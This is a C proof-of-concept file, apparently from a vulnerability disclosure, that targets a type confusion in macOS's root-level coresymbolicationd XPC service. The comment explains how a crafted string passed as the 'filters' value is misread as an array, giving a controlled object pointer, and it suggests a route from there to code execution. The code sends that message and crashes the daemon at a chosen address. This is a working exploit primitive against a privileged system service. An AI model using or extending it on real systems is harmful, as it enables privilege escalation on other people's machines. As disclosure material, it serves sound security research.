// clang -o coresymbolication_type_confusion coresymbolication_type_confusion.c -framework CoreFoundation

/*
coresymbolicationd is an on-demand xpc service running as root with the service name "com.apple.coresymbolicationd".

The coresymbolicationd commands match_mmap_archives, delete_mmap_archives, write_mmap_archive and read_mmap_archive
all perform insufficient type validation of xpc_object_t's:

The top level type of an xpc message is a dictionary, the function at __text:0000000100001620 in coresymbolicationd is responsible
for parsing this dictionary and sending any reply messages.

The value of the key "cmd" is a uint64 which determines the intended command. For messages with a cmd value of 2 or 3 (match_mmap_archives and delete_mmap_archives)
coresymbolicationd will read a value from the top level dictionary with the key "filters". For messages with a cmd value of 4 or 5 coresymbolicationd will read a value with the key "entry". In both these cases coresymbolicationd uses the xpc_dictionary_get_value API which enforces no type on the returned value (the value of these keys can be any xpc type.) The returned object in each case is then used as an xpc array without checking that it is in fact an xpc array. From this array another array is read at offset 0 using xpc_array_get_value.

It just so happens that the layout of xpc strings and arrays overlap in such a way that the string length field will be interpreted as the array length field
and the string character data pointer will be interpreted as the array data pointer - this means that we can craft a string such that the first 8 characters will
be interpreted as a pointer to an xpc_object_t. This type is just an objective-c object (right?) - at the very least the subsequent xpc_retain call allows an arbitrary increment,
and I'm pretty sure that you could get code execution by pointing to a fake objective-c object with a cached "_xref_dispose" method. All the phrack articles are pretty out-of-date on objective-c internals though so I haven't played with this more yet.

This PoC will crash trying to increment the reference count of an object at 0x4141414141414141.

either attach to coresymbolicationd if it's running or get lldb to wait for it like this:

$ sudo lldb
(lldb) process attach --name coresymbolicationd --waitfor
*/

#include <stdio.h>
#include <stdlib.h>

#include <xpc/xpc.h>
#include <CoreFoundation/CoreFoundation.h>

int main(){
  xpc_connection_t conn = xpc_connection_create_mach_service("com.apple.coresymbolicationd", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);

  xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
    xpc_type_t t = xpc_get_type(event);
    if (t == XPC_TYPE_ERROR){
      printf("err: %s\n", xpc_dictionary_get_string(event, XPC_ERROR_KEY_DESCRIPTION));
    }
    printf("received an event\n");
  });
  xpc_connection_resume(conn);

  xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);

  xpc_dictionary_set_uint64(msg, "cmd", 2);
  xpc_dictionary_set_string(msg, "filters", "AAAAAAAA");

  xpc_connection_send_message(conn, msg);
  xpc_connection_send_barrier(conn, ^{printf("sent\n");});
  xpc_release(msg);

  for(;;){
    CFRunLoopRunInMode(kCFRunLoopDefaultMode, DBL_MAX, TRUE);
  }
  return 0;
}
